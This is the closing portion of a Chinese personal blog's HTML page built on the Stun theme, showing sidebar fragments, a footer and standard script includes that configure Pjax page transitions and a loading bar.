          3.2：关键技术</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/notAlone.png" alt="avatar"></div><p class="sidebar-ov-author__text">但愿五湖明月在。</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">50</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">21</div><div class="sidebar-ov-state-item__name">分类</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022~2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>镜坛主</span></div><div>欢迎来到 —— 镜坛！</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
  var pjax = new Pjax({"selectors":["head title","#main",".pjax-reload",".header-banner"],"history":true,"scrollTo":false,"scrollRestoration":false,"cacheBust":false,"debug":false,"currentUrlFullReload":false,"timeout":0});
  // 加载进度条的计时器
  var loadingTimer = null;

  // 重置页面 Y 方向上的滚动偏移量
  document.addEventListener('pjax:send', function () {
    $('.header-nav-menu').removeClass('show');
    if (CONFIG.pjax && CONFIG.pjax.avoidBanner) {
      $('html').velocity('scroll', {
        duration: 500,
        offset: $('#header').height(),
        easing: 'easeInOutCubic'
      });
    }

    var loadingBarWidth = 20;
    var MAX_LOADING_WIDTH = 95;

    $('.loading-bar').addClass('loading');
    $('.loading-bar__progress').css('width', loadingBarWidth + '%');
    clearInterval(loadingTimer);
    loadingTimer = setInterval(function () {
      loadingBarWidth += 3;
      if (loadingBarWidth > MAX_LOADING_WIDTH) {
        loadingBarWidth = MAX_LOADING_WIDTH;
      }
      $('.loading-bar__progress').css('width', loadingBarWidth + '%');
    }, 500);
  }, false);

  window.addEventListener('pjax:complete', function () {
    clearInterval(loadingTimer);
    $('.loading-bar__progress').css('width', '100%');
    $('.loading-bar').removeClass('loading');
    setTimeout(function () {
      $('.loading-bar__progress').css('width', '0');
    }, 400);
    $('link[rel=prefetch], script[data-pjax-rm]').each(function () {
      $(this).remove();
    });
    $('script[data-pjax], #pjax-reload script').each(function () {
      $(this).parent().append($(this).remove());
    });

    if (Stun.utils.pjaxReloadBoot) {
      Stun.utils.pjaxReloadBoot();
    }
    if (Stun.utils.pjaxReloadScroll) {
      Stun.utils.pjaxReloadScroll();
    }
    if (Stun.utils.pjaxReloadSidebar) {
      Stun.utils.pjaxReloadSidebar();
    }
    if (false) {
      if (Stun.utils.pjaxReloadHeader) {
        Stun.utils.pjaxReloadHeader();
      }
      if (Stun.utils.pjaxReloadScrollIcon) {
        Stun.utils.pjaxReloadScrollIcon();
      }
      if (Stun.utils.pjaxReloadLocalSearch) {
        Stun.utils.pjaxReloadLocalSearch();
      }
    }
  }, false);
}, false);</script><div id="pjax-reload"></div><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/web-effect-click.js?v=2.8.0"></script><script src="/js/web-effect-flower.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script></body></html>